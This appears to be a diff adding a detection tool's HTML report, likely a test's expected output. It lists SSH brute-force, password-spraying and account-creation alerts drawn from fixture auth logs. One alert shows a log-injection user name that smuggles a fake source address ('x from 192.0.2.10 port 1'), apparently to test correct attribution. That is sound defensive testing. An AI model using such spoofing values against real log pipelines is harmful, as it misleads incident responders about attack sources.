+<tr><td class="time">2024-03-10 09:06:17Z</td><td class="nowrap">web01</td><td class="nowrap">auth.log:11</td><td class="event">Failed password for invalid user test from 203.0.113.45 port 40062 ssh2</td></tr>
+<tr><td class="time">2024-03-10 09:06:24Z</td><td class="nowrap">web01</td><td class="nowrap">auth.log:12</td><td class="event">Failed password for root from 203.0.113.45 port 40070 ssh2</td></tr>
+<tr><td class="time">2024-03-10 09:06:31Z</td><td class="nowrap">web01</td><td class="nowrap">auth.log:13</td><td class="event">Failed password for opsadmin from 203.0.113.45 port 40078 ssh2</td></tr>
+</tbody></table></div>
+</div>
+</details>
+<details class="alert" id="alert-23">
+<summary><span class="level level-medium">medium</span>
+<span class="title">Local User Account Created</span>
+<span class="muted">2024-03-10 09:08:12Z &middot; web01 &middot; 1 event(s)</span></summary>
+<div class="body">
+<p>A local user account was created with useradd. Attackers create accounts to keep access to a compromised host.</p>
+<dl>
+  <dt>When</dt><dd>2024-03-10 09:08:12Z</dd>
+  <dt>ATT&amp;CK</dt><dd><a href="https://attack.mitre.org/techniques/T1136/001">T1136.001</a> Create Account: Local Account <span class="muted">(Persistence)</span></dd>
+  <dt>Rule</dt><dd>Local User Account Created <code>30bda398-aea5-47d4-bc2c-0a7a01d09698</code></dd>
+  <dt>Author</dt><dd>Bouliw</dd>
+<dt>False positives</dt><dd>Administrators creating accounts; Package installations that create service accounts</dd></dl>
+<div class="scroll"><table>
+<thead><tr><th>Time</th><th>Host</th><th>Origin</th><th>Event</th></tr></thead>
+<tbody>
+<tr><td class="time">2024-03-10 09:08:12Z</td><td class="nowrap">web01</td><td class="nowrap">auth.log:23</td><td class="event">new user: name=svc_update, UID=1003, GID=1003, home=/home/svc_update, shell=/bin/bash, from=/dev/pts/1</td></tr>
+</tbody></table></div>
+</div>
+</details>
+<details class="alert" id="alert-24">
+<summary><span class="level level-medium">medium</span>
+<span class="title">SSH Brute Force</span>
+<span class="muted">2024-04-03 02:00:05Z &middot; backup01 &middot; 10 event(s)</span></summary>
+<div class="body">
+<p>At least 10 failed SSH password attempts from the same source address within 5 minutes, the signature of an automated password guessing attack.</p>
+<dl>
+  <dt>When</dt><dd>2024-04-03 02:00:05Z to 2024-04-03 02:01:08Z</dd>
+<dt>Grouped by</dt><dd><code>src_ip = 192.0.2.50</code> </dd>  <dt>ATT&amp;CK</dt><dd><a href="https://attack.mitre.org/techniques/T1110/001">T1110.001</a> Brute Force: Password Guessing <span class="muted">(Credential Access)</span></dd>
+  <dt>Rule</dt><dd>SSH Brute Force <code>44043ef0-67f0-4380-9c98-b348be632e58</code> (correlation)</dd>
+  <dt>Author</dt><dd>Bouliw</dd>
+<dt>False positives</dt><dd>A misconfigured script or service retrying an outdated password; Vulnerability scanners run by the security team</dd></dl>
+<div class="scroll"><table>
+<thead><tr><th>Time</th><th>Host</th><th>Origin</th><th>Event</th></tr></thead>
+<tbody>
+<tr><td class="time">2024-04-03 02:00:05Z</td><td class="nowrap">backup01</td><td class="nowrap">auth_retry_storm.log:2</td><td class="event">Failed password for backup from 192.0.2.50 port 40000 ssh2</td></tr>
+<tr><td class="time">2024-04-03 02:00:12Z</td><td class="nowrap">backup01</td><td class="nowrap">auth_retry_storm.log:3</td><td class="event">Failed password for backup from 192.0.2.50 port 40001 ssh2</td></tr>
+<tr><td class="time">2024-04-03 02:00:19Z</td><td class="nowrap">backup01</td><td class="nowrap">auth_retry_storm.log:4</td><td class="event">Failed password for backup from 192.0.2.50 port 40002 ssh2</td></tr>
+<tr><td class="time">2024-04-03 02:00:26Z</td><td class="nowrap">backup01</td><td class="nowrap">auth_retry_storm.log:5</td><td class="event">Failed password for backup from 192.0.2.50 port 40003 ssh2</td></tr>
+<tr><td class="time">2024-04-03 02:00:33Z</td><td class="nowrap">backup01</td><td class="nowrap">auth_retry_storm.log:6</td><td class="event">Failed password for backup from 192.0.2.50 port 40004 ssh2</td></tr>
+<tr><td class="time">2024-04-03 02:00:40Z</td><td class="nowrap">backup01</td><td class="nowrap">auth_retry_storm.log:7</td><td class="event">Failed password for backup from 192.0.2.50 port 40005 ssh2</td></tr>
+<tr><td class="time">2024-04-03 02:00:47Z</td><td class="nowrap">backup01</td><td class="nowrap">auth_retry_storm.log:8</td><td class="event">Failed password for backup from 192.0.2.50 port 40006 ssh2</td></tr>
+<tr><td class="time">2024-04-03 02:00:54Z</td><td class="nowrap">backup01</td><td class="nowrap">auth_retry_storm.log:9</td><td class="event">Failed password for backup from 192.0.2.50 port 40007 ssh2</td></tr>
+<tr><td class="time">2024-04-03 02:01:01Z</td><td class="nowrap">backup01</td><td class="nowrap">auth_retry_storm.log:10</td><td class="event">Failed password for backup from 192.0.2.50 port 40008 ssh2</td></tr>
+<tr><td class="time">2024-04-03 02:01:08Z</td><td class="nowrap">backup01</td><td class="nowrap">auth_retry_storm.log:11</td><td class="event">Failed password for backup from 192.0.2.50 port 40009 ssh2</td></tr>
+</tbody></table></div>
+</div>
+</details>
+<details class="alert" id="alert-25">
+<summary><span class="level level-medium">medium</span>
+<span class="title">SSH Brute Force</span>
+<span class="muted">2024-06-03 08:00:00Z &middot; web01 &middot; 10 event(s)</span></summary>
+<div class="body">
+<p>At least 10 failed SSH password attempts from the same source address within 5 minutes, the signature of an automated password guessing attack.</p>
+<dl>
+  <dt>When</dt><dd>2024-06-03 08:00:00Z to 2024-06-03 08:04:57Z</dd>
+<dt>Grouped by</dt><dd><code>src_ip = 203.0.113.77</code> </dd>  <dt>ATT&amp;CK</dt><dd><a href="https://attack.mitre.org/techniques/T1110/001">T1110.001</a> Brute Force: Password Guessing <span class="muted">(Credential Access)</span></dd>
+  <dt>Rule</dt><dd>SSH Brute Force <code>44043ef0-67f0-4380-9c98-b348be632e58</code> (correlation)</dd>
+  <dt>Author</dt><dd>Bouliw</dd>
+<dt>False positives</dt><dd>A misconfigured script or service retrying an outdated password; Vulnerability scanners run by the security team</dd></dl>
+<div class="scroll"><table>
+<thead><tr><th>Time</th><th>Host</th><th>Origin</th><th>Event</th></tr></thead>
+<tbody>
+<tr><td class="time">2024-06-03 08:00:00Z</td><td class="nowrap">web01</td><td class="nowrap">auth_bruteforce_timing.log:1</td><td class="event">Failed password for root from 203.0.113.77 port 41000 ssh2</td></tr>
+<tr><td class="time">2024-06-03 08:00:33Z</td><td class="nowrap">web01</td><td class="nowrap">auth_bruteforce_timing.log:2</td><td class="event">Failed password for root from 203.0.113.77 port 41001 ssh2</td></tr>
+<tr><td class="time">2024-06-03 08:01:06Z</td><td class="nowrap">web01</td><td class="nowrap">auth_bruteforce_timing.log:3</td><td class="event">Failed password for root from 203.0.113.77 port 41002 ssh2</td></tr>
+<tr><td class="time">2024-06-03 08:01:39Z</td><td class="nowrap">web01</td><td class="nowrap">auth_bruteforce_timing.log:4</td><td class="event">Failed password for root from 203.0.113.77 port 41003 ssh2</td></tr>
+<tr><td class="time">2024-06-03 08:02:12Z</td><td class="nowrap">web01</td><td class="nowrap">auth_bruteforce_timing.log:5</td><td class="event">Failed password for root from 203.0.113.77 port 41004 ssh2</td></tr>
+<tr><td class="time">2024-06-03 08:02:45Z</td><td class="nowrap">web01</td><td class="nowrap">auth_bruteforce_timing.log:6</td><td class="event">Failed password for root from 203.0.113.77 port 41005 ssh2</td></tr>
+<tr><td class="time">2024-06-03 08:03:18Z</td><td class="nowrap">web01</td><td class="nowrap">auth_bruteforce_timing.log:7</td><td class="event">Failed password for root from 203.0.113.77 port 41006 ssh2</td></tr>
+<tr><td class="time">2024-06-03 08:03:51Z</td><td class="nowrap">web01</td><td class="nowrap">auth_bruteforce_timing.log:8</td><td class="event">Failed password for root from 203.0.113.77 port 41007 ssh2</td></tr>
+<tr><td class="time">2024-06-03 08:04:24Z</td><td class="nowrap">web01</td><td class="nowrap">auth_bruteforce_timing.log:9</td><td class="event">Failed password for root from 203.0.113.77 port 41008 ssh2</td></tr>
+<tr><td class="time">2024-06-03 08:04:57Z</td><td class="nowrap">web01</td><td class="nowrap">auth_bruteforce_timing.log:10</td><td class="event">Failed password for root from 203.0.113.77 port 41009 ssh2</td></tr>
+</tbody></table></div>
+</div>
+</details>
+<details class="alert" id="alert-26">
+<summary><span class="level level-medium">medium</span>
+<span class="title">SSH Brute Force</span>
+<span class="muted">2024-06-03 09:00:00Z &middot; web01 &middot; 10 event(s)</span></summary>
+<div class="body">
+<p>At least 10 failed SSH password attempts from the same source address within 5 minutes, the signature of an automated password guessing attack.</p>
+<dl>
+  <dt>When</dt><dd>2024-06-03 09:00:00Z to 2024-06-03 09:00:27Z</dd>
+<dt>Grouped by</dt><dd><code>src_ip = 203.0.113.78</code> </dd>  <dt>ATT&amp;CK</dt><dd><a href="https://attack.mitre.org/techniques/T1110/001">T1110.001</a> Brute Force: Password Guessing <span class="muted">(Credential Access)</span></dd>
+  <dt>Rule</dt><dd>SSH Brute Force <code>44043ef0-67f0-4380-9c98-b348be632e58</code> (correlation)</dd>
+  <dt>Author</dt><dd>Bouliw</dd>
+<dt>False positives</dt><dd>A misconfigured script or service retrying an outdated password; Vulnerability scanners run by the security team</dd></dl>
+<div class="scroll"><table>
+<thead><tr><th>Time</th><th>Host</th><th>Origin</th><th>Event</th></tr></thead>
+<tbody>
+<tr><td class="time">2024-06-03 09:00:00Z</td><td class="nowrap">web01</td><td class="nowrap">auth_bruteforce_timing.log:21</td><td class="event">Failed password for root from 203.0.113.78 port 42000 ssh2</td></tr>
+<tr><td class="time">2024-06-03 09:00:03Z</td><td class="nowrap">web01</td><td class="nowrap">auth_bruteforce_timing.log:22</td><td class="event">Failed password for root from 203.0.113.78 port 42001 ssh2</td></tr>
+<tr><td class="time">2024-06-03 09:00:06Z</td><td class="nowrap">web01</td><td class="nowrap">auth_bruteforce_timing.log:23</td><td class="event">Failed password for root from 203.0.113.78 port 42002 ssh2</td></tr>
+<tr><td class="time">2024-06-03 09:00:09Z</td><td class="nowrap">web01</td><td class="nowrap">auth_bruteforce_timing.log:24</td><td class="event">Failed password for root from 203.0.113.78 port 42003 ssh2</td></tr>
+<tr><td class="time">2024-06-03 09:00:12Z</td><td class="nowrap">web01</td><td class="nowrap">auth_bruteforce_timing.log:25</td><td class="event">Failed password for root from 203.0.113.78 port 42004 ssh2</td></tr>
+<tr><td class="time">2024-06-03 09:00:15Z</td><td class="nowrap">web01</td><td class="nowrap">auth_bruteforce_timing.log:26</td><td class="event">Failed password for root from 203.0.113.78 port 42005 ssh2</td></tr>
+<tr><td class="time">2024-06-03 09:00:18Z</td><td class="nowrap">web01</td><td class="nowrap">auth_bruteforce_timing.log:27</td><td class="event">Failed password for root from 203.0.113.78 port 42006 ssh2</td></tr>
+<tr><td class="time">2024-06-03 09:00:21Z</td><td class="nowrap">web01</td><td class="nowrap">auth_bruteforce_timing.log:28</td><td class="event">Failed password for root from 203.0.113.78 port 42007 ssh2</td></tr>
+<tr><td class="time">2024-06-03 09:00:24Z</td><td class="nowrap">web01</td><td class="nowrap">auth_bruteforce_timing.log:29</td><td class="event">Failed password for root from 203.0.113.78 port 42008 ssh2</td></tr>
+<tr><td class="time">2024-06-03 09:00:27Z</td><td class="nowrap">web01</td><td class="nowrap">auth_bruteforce_timing.log:30</td><td class="event">Failed password for root from 203.0.113.78 port 42009 ssh2</td></tr>
+</tbody></table></div>
+</div>
+</details>
+<details class="alert" id="alert-27">
+<summary><span class="level level-medium">medium</span>
+<span class="title">SSH Brute Force</span>
+<span class="muted">2024-06-03 10:00:10Z &middot; web01 &middot; 10 event(s)</span></summary>
+<div class="body">
+<p>At least 10 failed SSH password attempts from the same source address within 5 minutes, the signature of an automated password guessing attack.</p>
+<dl>
+  <dt>When</dt><dd>2024-06-03 10:00:10Z to 2024-06-03 10:00:37Z</dd>
+<dt>Grouped by</dt><dd><code>src_ip = 203.0.113.79</code> </dd>  <dt>ATT&amp;CK</dt><dd><a href="https://attack.mitre.org/techniques/T1110/001">T1110.001</a> Brute Force: Password Guessing <span class="muted">(Credential Access)</span></dd>
+  <dt>Rule</dt><dd>SSH Brute Force <code>44043ef0-67f0-4380-9c98-b348be632e58</code> (correlation)</dd>
+  <dt>Author</dt><dd>Bouliw</dd>
+<dt>False positives</dt><dd>A misconfigured script or service retrying an outdated password; Vulnerability scanners run by the security team</dd></dl>
+<div class="scroll"><table>
+<thead><tr><th>Time</th><th>Host</th><th>Origin</th><th>Event</th></tr></thead>
+<tbody>
+<tr><td class="time">2024-06-03 10:00:10Z</td><td class="nowrap">web01</td><td class="nowrap">auth_bruteforce_timing.log:33</td><td class="event">Failed password for root from 203.0.113.79 port 43001 ssh2</td></tr>
+<tr><td class="time">2024-06-03 10:00:13Z</td><td class="nowrap">web01</td><td class="nowrap">auth_bruteforce_timing.log:34</td><td class="event">Failed password for root from 203.0.113.79 port 43002 ssh2</td></tr>
+<tr><td class="time">2024-06-03 10:00:16Z</td><td class="nowrap">web01</td><td class="nowrap">auth_bruteforce_timing.log:35</td><td class="event">Failed password for root from 203.0.113.79 port 43003 ssh2</td></tr>
+<tr><td class="time">2024-06-03 10:00:19Z</td><td class="nowrap">web01</td><td class="nowrap">auth_bruteforce_timing.log:36</td><td class="event">Failed password for root from 203.0.113.79 port 43004 ssh2</td></tr>
+<tr><td class="time">2024-06-03 10:00:22Z</td><td class="nowrap">web01</td><td class="nowrap">auth_bruteforce_timing.log:37</td><td class="event">Failed password for root from 203.0.113.79 port 43005 ssh2</td></tr>
+<tr><td class="time">2024-06-03 10:00:25Z</td><td class="nowrap">web01</td><td class="nowrap">auth_bruteforce_timing.log:38</td><td class="event">Failed password for root from 203.0.113.79 port 43006 ssh2</td></tr>
+<tr><td class="time">2024-06-03 10:00:28Z</td><td class="nowrap">web01</td><td class="nowrap">auth_bruteforce_timing.log:39</td><td class="event">Failed password for root from 203.0.113.79 port 43007 ssh2</td></tr>
+<tr><td class="time">2024-06-03 10:00:31Z</td><td class="nowrap">web01</td><td class="nowrap">auth_bruteforce_timing.log:40</td><td class="event">Failed password for root from 203.0.113.79 port 43008 ssh2</td></tr>
+<tr><td class="time">2024-06-03 10:00:34Z</td><td class="nowrap">web01</td><td class="nowrap">auth_bruteforce_timing.log:41</td><td class="event">Failed password for root from 203.0.113.79 port 43009 ssh2</td></tr>
+<tr><td class="time">2024-06-03 10:00:37Z</td><td class="nowrap">web01</td><td class="nowrap">auth_bruteforce_timing.log:42</td><td class="event">Failed password for root from 203.0.113.79 port 43010 ssh2</td></tr>
+</tbody></table></div>
+</div>
+</details>
+<details class="alert" id="alert-28">
+<summary><span class="level level-medium">medium</span>
+<span class="title">SSH Brute Force</span>
+<span class="muted">2024-06-03 11:00:00Z &middot; web01 &middot; 10 event(s)</span></summary>
+<div class="body">
+<p>At least 10 failed SSH password attempts from the same source address within 5 minutes, the signature of an automated password guessing attack.</p>
+<dl>
+  <dt>When</dt><dd>2024-06-03 11:00:00Z to 2024-06-03 11:00:27Z</dd>
+<dt>Grouped by</dt><dd><code>src_ip = 203.0.113.80</code> </dd>  <dt>ATT&amp;CK</dt><dd><a href="https://attack.mitre.org/techniques/T1110/001">T1110.001</a> Brute Force: Password Guessing <span class="muted">(Credential Access)</span></dd>
+  <dt>Rule</dt><dd>SSH Brute Force <code>44043ef0-67f0-4380-9c98-b348be632e58</code> (correlation)</dd>
+  <dt>Author</dt><dd>Bouliw</dd>
+<dt>False positives</dt><dd>A misconfigured script or service retrying an outdated password; Vulnerability scanners run by the security team</dd></dl>
+<div class="scroll"><table>
+<thead><tr><th>Time</th><th>Host</th><th>Origin</th><th>Event</th></tr></thead>
+<tbody>
+<tr><td class="time">2024-06-03 11:00:00Z</td><td class="nowrap">web01</td><td class="nowrap">auth_bruteforce_timing.log:43</td><td class="event">Failed password for root from 203.0.113.80 port 44000 ssh2</td></tr>
+<tr><td class="time">2024-06-03 11:00:03Z</td><td class="nowrap">web01</td><td class="nowrap">auth_bruteforce_timing.log:44</td><td class="event">Failed password for root from 203.0.113.80 port 44001 ssh2</td></tr>
+<tr><td class="time">2024-06-03 11:00:06Z</td><td class="nowrap">web01</td><td class="nowrap">auth_bruteforce_timing.log:45</td><td class="event">Failed password for root from 203.0.113.80 port 44002 ssh2</td></tr>
+<tr><td class="time">2024-06-03 11:00:09Z</td><td class="nowrap">web01</td><td class="nowrap">auth_bruteforce_timing.log:46</td><td class="event">Failed password for root from 203.0.113.80 port 44003 ssh2</td></tr>
+<tr><td class="time">2024-06-03 11:00:12Z</td><td class="nowrap">web01</td><td class="nowrap">auth_bruteforce_timing.log:47</td><td class="event">Failed password for root from 203.0.113.80 port 44004 ssh2</td></tr>
+<tr><td class="time">2024-06-03 11:00:15Z</td><td class="nowrap">web01</td><td class="nowrap">auth_bruteforce_timing.log:48</td><td class="event">Failed password for root from 203.0.113.80 port 44005 ssh2</td></tr>
+<tr><td class="time">2024-06-03 11:00:18Z</td><td class="nowrap">web01</td><td class="nowrap">auth_bruteforce_timing.log:49</td><td class="event">Failed password for root from 203.0.113.80 port 44006 ssh2</td></tr>
+<tr><td class="time">2024-06-03 11:00:21Z</td><td class="nowrap">web01</td><td class="nowrap">auth_bruteforce_timing.log:50</td><td class="event">Failed password for root from 203.0.113.80 port 44007 ssh2</td></tr>
+<tr><td class="time">2024-06-03 11:00:24Z</td><td class="nowrap">web01</td><td class="nowrap">auth_bruteforce_timing.log:51</td><td class="event">Failed password for root from 203.0.113.80 port 44008 ssh2</td></tr>
+<tr><td class="time">2024-06-03 11:00:27Z</td><td class="nowrap">web01</td><td class="nowrap">auth_bruteforce_timing.log:52</td><td class="event">Failed password for root from 203.0.113.80 port 44009 ssh2</td></tr>
+</tbody></table></div>
+</div>
+</details>
+<details class="alert" id="alert-29">
+<summary><span class="level level-medium">medium</span>
+<span class="title">SSH Password Spraying</span>
+<span class="muted">2024-06-03 14:30:00Z &middot; web01 &middot; 5 event(s)</span></summary>
+<div class="body">
+<p>Failed SSH password attempts against at least 5 different user names from the same source address within 10 minutes. Trying many accounts with a few common passwords avoids per-account lockouts.</p>
+<dl>
+  <dt>When</dt><dd>2024-06-03 14:30:00Z to 2024-06-03 14:39:50Z</dd>
+<dt>Grouped by</dt><dd><code>src_ip = 198.51.100.85</code> </dd>  <dt>ATT&amp;CK</dt><dd><a href="https://attack.mitre.org/techniques/T1110/003">T1110.003</a> Brute Force: Password Spraying <span class="muted">(Credential Access)</span></dd>
+  <dt>Rule</dt><dd>SSH Password Spraying <code>a5668195-278b-4b24-aaf9-53ee8ff41701</code> (correlation)</dd>
+  <dt>Author</dt><dd>Bouliw</dd>
+<dt>False positives</dt><dd>A shared jump host where several users mistype their passwords in a short time</dd></dl>
+<div class="scroll"><table>
+<thead><tr><th>Time</th><th>Host</th><th>Origin</th><th>Event</th></tr></thead>
+<tbody>
+<tr><td class="time">2024-06-03 14:30:00Z</td><td class="nowrap">web01</td><td class="nowrap">auth_bruteforce_timing.log:82</td><td class="event">Failed password for invalid user admin from 198.51.100.85 port 49000 ssh2</td></tr>
+<tr><td class="time">2024-06-03 14:32:27Z</td><td class="nowrap">web01</td><td class="nowrap">auth_bruteforce_timing.log:83</td><td class="event">Failed password for invalid user postgres from 198.51.100.85 port 49001 ssh2</td></tr>
+<tr><td class="time">2024-06-03 14:34:54Z</td><td class="nowrap">web01</td><td class="nowrap">auth_bruteforce_timing.log:84</td><td class="event">Failed password for invalid user git from 198.51.100.85 port 49002 ssh2</td></tr>
+<tr><td class="time">2024-06-03 14:37:21Z</td><td class="nowrap">web01</td><td class="nowrap">auth_bruteforce_timing.log:85</td><td class="event">Failed password for invalid user pi from 198.51.100.85 port 49003 ssh2</td></tr>
+<tr><td class="time">2024-06-03 14:39:50Z</td><td class="nowrap">web01</td><td class="nowrap">auth_bruteforce_timing.log:86</td><td class="event">Failed password for invalid user user from 198.51.100.85 port 49004 ssh2</td></tr>
+</tbody></table></div>
+</div>
+</details>
+<details class="alert" id="alert-30">
+<summary><span class="level level-medium">medium</span>
+<span class="title">SSH Brute Force</span>
+<span class="muted">2024-06-03 16:00:00Z &middot; web01 &middot; 10 event(s)</span></summary>
+<div class="body">
+<p>At least 10 failed SSH password attempts from the same source address within 5 minutes, the signature of an automated password guessing attack.</p>
+<dl>
+  <dt>When</dt><dd>2024-06-03 16:00:00Z to 2024-06-03 16:00:45Z</dd>
+<dt>Grouped by</dt><dd><code>src_ip = 198.51.100.66</code> </dd>  <dt>ATT&amp;CK</dt><dd><a href="https://attack.mitre.org/techniques/T1110/001">T1110.001</a> Brute Force: Password Guessing <span class="muted">(Credential Access)</span></dd>
+  <dt>Rule</dt><dd>SSH Brute Force <code>44043ef0-67f0-4380-9c98-b348be632e58</code> (correlation)</dd>
+  <dt>Author</dt><dd>Bouliw</dd>
+<dt>False positives</dt><dd>A misconfigured script or service retrying an outdated password; Vulnerability scanners run by the security team</dd></dl>
+<div class="scroll"><table>
+<thead><tr><th>Time</th><th>Host</th><th>Origin</th><th>Event</th></tr></thead>
+<tbody>
+<tr><td class="time">2024-06-03 16:00:00Z</td><td class="nowrap">web01</td><td class="nowrap">auth_bruteforce_timing.log:98</td><td class="event">Failed password for invalid user x from 192.0.2.10 port 1 from 198.51.100.66 port 53000 ssh2</td></tr>
+<tr><td class="time">2024-06-03 16:00:05Z</td><td class="nowrap">web01</td><td class="nowrap">auth_bruteforce_timing.log:99</td><td class="event">Failed password for invalid user x from 192.0.2.10 port 1 from 198.51.100.66 port 53001 ssh2</td></tr>
+<tr><td class="time">2024-06-03 16:00:10Z</td><td class="nowrap">web01</td><td class="nowrap">auth_bruteforce_timing.log:100</td><td class="event">Failed password for invalid user x from 192.0.2.10 port 1 from 198.51.100.66 port 53002 ssh2</td></tr>
+<tr><td class="time">2024-06-03 16:00:15Z</td><td class="nowrap">web01</td><td class="nowrap">auth_bruteforce_timing.log:101</td><td class="event">Failed password for invalid user x from 192.0.2.10 port 1 from 198.51.100.66 port 53003 ssh2</td></tr>
+<tr><td class="time">2024-06-03 16:00:20Z</td><td class="nowrap">web01</td><td class="nowrap">auth_bruteforce_timing.log:102</td><td class="event">Failed password for invalid user x from 192.0.2.10 port 1 from 198.51.100.66 port 53004 ssh2</td></tr>
+<tr><td class="time">2024-06-03 16:00:25Z</td><td class="nowrap">web01</td><td class="nowrap">auth_bruteforce_timing.log:103</td><td class="event">Failed password for invalid user x from 192.0.2.10 port 1 from 198.51.100.66 port 53005 ssh2</td></tr>
+<tr><td class="time">2024-06-03 16:00:30Z</td><td class="nowrap">web01</td><td class="nowrap">auth_bruteforce_timing.log:104</td><td class="event">Failed password for invalid user x from 192.0.2.10 port 1 from 198.51.100.66 port 53006 ssh2</td></tr>
+<tr><td class="time">2024-06-03 16:00:35Z</td><td class="nowrap">web01</td><td class="nowrap">auth_bruteforce_timing.log:105</td><td class="event">Failed password for invalid user x from 192.0.2.10 port 1 from 198.51.100.66 port 53007 ssh2</td></tr>
+<tr><td class="time">2024-06-03 16:00:40Z</td><td class="nowrap">web01</td><td class="nowrap">auth_bruteforce_timing.log:106</td><td class="event">Failed password for invalid user x from 192.0.2.10 port 1 from 198.51.100.66 port 53008 ssh2</td></tr>
+<tr><td class="time">2024-06-03 16:00:45Z</td><td class="nowrap">web01</td><td class="nowrap">auth_bruteforce_timing.log:107</td><td class="event">Failed password for invalid user x from 192.0.2.10 port 1 from 198.51.100.66 port 53009 ssh2</td></tr>
+</tbody></table></div>
+</div>
+</details>
+<details class="alert" id="alert-31">
+<summary><span class="level level-medium">medium</span>
+<span class="title">SSH Brute Force</span>
+<span class="muted">2024-06-04 08:05:00Z &middot; deb13 &middot; 10 event(s)</span></summary>
+<div class="body">
+<p>At least 10 failed SSH password attempts from the same source address within 5 minutes, the signature of an automated password guessing attack.</p>
+<dl>
+  <dt>When</dt><dd>2024-06-04 08:05:00Z to 2024-06-04 08:05:18Z</dd>
+<dt>Grouped by</dt><dd><code>src_ip = 203.0.113.90</code> </dd>  <dt>ATT&amp;CK</dt><dd><a href="https://attack.mitre.org/techniques/T1110/001">T1110.001</a> Brute Force: Password Guessing <span class="muted">(Credential Access)</span></dd>
+  <dt>Rule</dt><dd>SSH Brute Force <code>44043ef0-67f0-4380-9c98-b348be632e58</code> (correlation)</dd>
+  <dt>Author</dt><dd>Bouliw</dd>
+<dt>False positives</dt><dd>A misconfigured script or service retrying an outdated password; Vulnerability scanners run by the security team</dd></dl>
+<div class="scroll"><table>
+<thead><tr><th>Time</th><th>Host</th><th>Origin</th><th>Event</th></tr></thead>
+<tbody>
+<tr><td class="time">2024-06-04 08:05:00Z</td><td class="nowrap">deb13</td><td class="nowrap">auth_openssh10.log:3</td><td class="event">Failed password for root from 203.0.113.90 port 51000 ssh2</td></tr>
+<tr><td class="time">2024-06-04 08:05:02Z</td><td class="nowrap">deb13</td><td class="nowrap">auth_openssh10.log:4</td><td class="event">Failed password for root from 203.0.113.90 port 51001 ssh2</td></tr>
+<tr><td class="time">2024-06-04 08:05:04Z</td><td class="nowrap">deb13</td><td class="nowrap">auth_openssh10.log:5</td><td class="event">Failed password for root from 203.0.113.90 port 51002 ssh2</td></tr>
+<tr><td class="time">2024-06-04 08:05:06Z</td><td class="nowrap">deb13</td><td class="nowrap">auth_openssh10.log:6</td><td class="event">Failed password for root from 203.0.113.90 port 51003 ssh2</td></tr>
+<tr><td class="time">2024-06-04 08:05:08Z</td><td class="nowrap">deb13</td><td class="nowrap">auth_openssh10.log:7</td><td class="event">Failed password for root from 203.0.113.90 port 51004 ssh2</td></tr>
+<tr><td class="time">2024-06-04 08:05:10Z</td><td class="nowrap">deb13</td><td class="nowrap">auth_openssh10.log:8</td><td class="event">Failed password for root from 203.0.113.90 port 51005 ssh2</td></tr>
+<tr><td class="time">2024-06-04 08:05:12Z</td><td class="nowrap">deb13</td><td class="nowrap">auth_openssh10.log:9</td><td class="event">Failed password for root from 203.0.113.90 port 51006 ssh2</td></tr>
+<tr><td class="time">2024-06-04 08:05:14Z</td><td class="nowrap">deb13</td><td class="nowrap">auth_openssh10.log:10</td><td class="event">Failed password for root from 203.0.113.90 port 51007 ssh2</td></tr>
+<tr><td class="time">2024-06-04 08:05:16Z</td><td class="nowrap">deb13</td><td class="nowrap">auth_openssh10.log:11</td><td class="event">Failed password for root from 203.0.113.90 port 51008 ssh2</td></tr>
+<tr><td class="time">2024-06-04 08:05:18Z</td><td class="nowrap">deb13</td><td class="nowrap">auth_openssh10.log:12</td><td class="event">Failed password for root from 203.0.113.90 port 51009 ssh2</td></tr>
+</tbody></table></div>
+</div>
+</details>
+<details class="alert" id="alert-32">
+<summary><span class="level level-medium">medium</span>
+<span class="title">SSH Brute Force</span>
+<span class="muted">2024-07-08 03:12:01Z &middot; web04 &middot; 10 event(s)</span></summary>
+<div class="body">
+<p>At least 10 failed SSH password attempts from the same source address within 5 minutes, the signature of an automated password guessing attack.</p>
+<dl>
+  <dt>When</dt><dd>2024-07-08 03:12:01Z to 2024-07-08 03:12:20Z</dd>
+<dt>Grouped by</dt><dd><code>src_ip = 203.0.113.120</code> </dd>  <dt>ATT&amp;CK</dt><dd><a href="https://attack.mitre.org/techniques/T1110/001">T1110.001</a> Brute Force: Password Guessing <span class="muted">(Credential Access)</span></dd>
+  <dt>Rule</dt><dd>SSH Brute Force <code>44043ef0-67f0-4380-9c98-b348be632e58</code> (correlation)</dd>
+  <dt>Author</dt><dd>Bouliw</dd>
+<dt>False positives</dt><dd>A misconfigured script or service retrying an outdated password; Vulnerability scanners run by the security team</dd></dl>
+<div class="scroll"><table>
+<thead><tr><th>Time</th><th>Host</th><th>Origin</th><th>Event</th></tr></thead>
+<tbody>
+<tr><td class="time">2024-07-08 03:12:01Z</td><td class="nowrap">web04</td><td class="nowrap">auth_rsyslog_repeated.log:1</td><td class="event">Failed password for root from 203.0.113.120 port 55010 ssh2</td></tr>
+<tr><td class="time">2024-07-08 03:12:09Z</td><td class="nowrap">web04</td><td class="nowrap">auth_rsyslog_repeated.log:2 (repeat 1/5)</td><td class="event">Failed password for root from 203.0.113.120 port 55010 ssh2</td></tr>
+<tr><td class="time">2024-07-08 03:12:09Z</td><td class="nowrap">web04</td><td class="nowrap">auth_rsyslog_repeated.log:2 (repeat 2/5)</td><td class="event">Failed password for root from 203.0.113.120 port 55010 ssh2</td></tr>
+<tr><td class="time">2024-07-08 03:12:09Z</td><td class="nowrap">web04</td><td class="nowrap">auth_rsyslog_repeated.log:2 (repeat 3/5)</td><td class="event">Failed password for root from 203.0.113.120 port 55010 ssh2</td></tr>
+<tr><td class="time">2024-07-08 03:12:09Z</td><td class="nowrap">web04</td><td class="nowrap">auth_rsyslog_repeated.log:2 (repeat 4/5)</td><td class="event">Failed password for root from 203.0.113.120 port 55010 ssh2</td></tr>
+<tr><td class="time">2024-07-08 03:12:09Z</td><td class="nowrap">web04</td><td class="nowrap">auth_rsyslog_repeated.log:2 (repeat 5/5)</td><td class="event">Failed password for root from 203.0.113.120 port 55010 ssh2</td></tr>
+<tr><td class="time">2024-07-08 03:12:12Z</td><td class="nowrap">web04</td><td class="nowrap">auth_rsyslog_repeated.log:6</td><td class="event">Failed password for root from 203.0.113.120 port 55020 ssh2</td></tr>
+<tr><td class="time">2024-07-08 03:12:20Z</td><td class="nowrap">web04</td><td class="nowrap">auth_rsyslog_repeated.log:7 (repeat 1/5)</td><td class="event">Failed password for root from 203.0.113.120 port 55020 ssh2</td></tr>
+<tr><td class="time">2024-07-08 03:12:20Z</td><td class="nowrap">web04</td><td class="nowrap">auth_rsyslog_repeated.log:7 (repeat 2/5)</td><td class="event">Failed password for root from 203.0.113.120 port 55020 ssh2</td></tr>
